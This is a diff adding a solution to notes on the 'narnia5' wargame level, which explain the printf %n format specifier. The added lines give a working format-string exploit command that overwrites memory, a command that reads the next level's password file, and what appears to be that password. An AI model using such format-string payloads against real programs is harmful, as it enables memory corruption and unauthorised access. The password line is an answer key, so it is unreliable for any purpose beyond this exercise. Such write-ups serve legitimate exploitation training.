@@ -24,3 +24,13 @@ To do this we can use %n which writes the number of characters printed up to tha
 It is usually used to update integer variables, for example:  
 printf("Hello, %nWorld!\n", &count);  
 Should write 7 to the count variable.  
+
+
+
+Ans:
+./narnia5 $(perl -e 'print "AAAA\xd0\xd5\xff\xff%492x%n"')
+
+cat /etc/narnia_pass/narnia6
+
+BAV0SUV0iM
+
